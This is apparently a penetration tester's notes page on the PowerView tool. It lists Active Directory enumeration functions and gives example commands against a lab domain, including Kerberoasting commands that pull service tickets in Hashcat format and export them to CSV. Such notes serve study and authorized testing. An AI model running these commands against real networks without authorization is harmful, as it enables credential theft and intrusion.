---
tags:
  - windows
  - powershell
  - password-policy
  - kerberoasting
---
# [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) (by PowerShell Mafia)
PowerView is a tool written in PowerShell which, much like BloodHound, provides a way to identify where users are logged in on a network, enumerate domain information such as users, computers, groups, ACLS, trusts, hunt for file shares and passwords, perform Kerberoasting, and more.
## Useful Commands
| **Command**                                                                                                                       | **Description**                                                                            |
| --------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `Export-PowerViewCSV`                                                                                                             | Append results to a CSV file                                                               |
| `ConvertTo-SID`                                                                                                                   | Convert a User or group name to its SID value                                              |
| `Get-DomainSPNTicket`                                                                                                             | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account          |
| **Domain/LDAP Functions:**                                                                                                        |                                                                                            |
| `Get-Domain`                                                                                                                      | Will return the AD object for the current (or specified) domain                            |
| `Get-DomainController`                                                                                                            | Return a list of the Domain Controllers for the specified domain                           |
| [[#[Get-DomainUser](https //powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/)\|Get-DomainUser]]                         | Will return all users or specific user objects in AD                                       |
| `Get-DomainComputer`                                                                                                              | Will return all computers or specific computer objects in AD                               |
| `Get-DomainGroup`                                                                                                                 | Will return all groups or specific group objects in AD                                     |
| `Get-DomainOU`                                                                                                                    | Search for all or specific OU objects in AD                                                |
| `Find-InterestingDomainAcl`                                                                                                       | Finds object ACLs in the domain with modification rights set to non-built in objects       |
| [[#[Get-DomainGroupMember](https //powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroupMember/)\|Get-DomainGroupMember]]    | Will return the members of a specific domain group                                         |
| `Get-DomainFileServer`                                                                                                            | Returns a list of servers likely functioning as file servers                               |
| `Get-DomainDFSShare`                                                                                                              | Returns a list of all distributed file systems for the current (or specified) domain       |
| **GPO Functions:**                                                                                                                |                                                                                            |
| `Get-DomainGPO`                                                                                                                   | Will return all GPOs or specific GPO objects in AD                                         |
| [[#[Get-DomainPolicy](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainPolicy/)\|Get-DomainPolicy]]                   | Returns the default domain policy or the domain controller policy for the current domain   |
| **Computer Enumeration Functions:**                                                                                               |                                                                                            |
| `Get-NetLocalGroup`                                                                                                               | Enumerates local groups on the local or a remote machine                                   |
| `Get-NetLocalGroupMember`                                                                                                         | Enumerates members of a specific local group                                               |
| `Get-NetShare`                                                                                                                    | Returns open shares on the local (or a remote) machine                                     |
| `Get-NetSession`                                                                                                                  | Will return session information for the local (or a remote) machine                        |
| [[#[Test-AdminAccess](https://powersploit.readthedocs.io/en/latest/Recon/Test-AdminAccess/)\|Test-AdminAccess]]                   | Tests if the current user has administrative access to the local (or a remote) machine     |
| **Threaded 'Meta'-Functions:**                                                                                                    |                                                                                            |
| `Find-DomainUserLocation`                                                                                                         | Finds machines where specific users are logged in                                          |
| `Find-DomainShare`                                                                                                                | Finds reachable shares on domain machines                                                  |
| `Find-InterestingDomainShareFile`                                                                                                 | Searches for files matching specific criteria on readable shares in the domain             |
| `Find-LocalAdminAccess`                                                                                                           | Find machines on the local domain where the current user has local administrator access    |
| **Domain Trust Functions:**                                                                                                       |                                                                                            |
| `Get-DomainTrust`                                                                                                                 | Returns domain trusts for the current domain or a specified domain                         |
| `Get-ForestTrust`                                                                                                                 | Returns all forest trusts for the current forest or a specified forest                     |
| `Get-DomainForeignUser`                                                                                                           | Enumerates users who are in groups outside of the user's domain                            |
| `Get-DomainForeignGroupMember`                                                                                                    | Enumerates groups with users outside of the group's domain and returns each foreign member |
| [[#[Get-DomainTrustMapping](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainTrustMapping/)\|Get-DomainTrustMapping]] | Will enumerate all trusts for the current domain and any others seen.                      |
### [Get-DomainPolicy](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainPolicy/)
Can be used to find password policy.
```powershell
PS > Get-DomainPolicy
```
### [Get-DomainUser](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/)
This provides information on all users or specific users we specify
```powershell
PS > Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```
- `SPN` attribute on accounts could indicate that the account may be subject to a Kerberoasting attack.
```powershell
PS > Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```
#### Kerberoasting
- Get a user's TGS Ticket in [[Hashcat]] format:
```powershell
PS > Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
- Get all TGS Tickets in `CSV`:
```powershell
PS > Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```
### [Get-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroupMember/)
It retrieves group-specific information. The `-Recurse` switch finds any groups that are part of the target group (nested group membership) to list out the members of those groups.
```powershell
PS >  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```
### [Get-DomainTrustMapping](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainTrustMapping/)
Find domain trust mapping similar to ActiveDirectory PS Module
```powershell
PS > Get-DomainTrustMapping
```
### [Test-AdminAccess](https://powersploit.readthedocs.io/en/latest/Recon/Test-AdminAccess/)
Used to test local admin access on current or a remote  machine.
```powershell
PS > Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```
Determines whether the current user is local admin on host `ACADEMY-EA-MS01` or not
# [PowerView](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1) (by "Empire 4")
The BC-SECURITY version of [PowerView](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1) has some new functions such as `Get-NetGmsa`, used to hunt for [Group Managed Service Accounts](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview).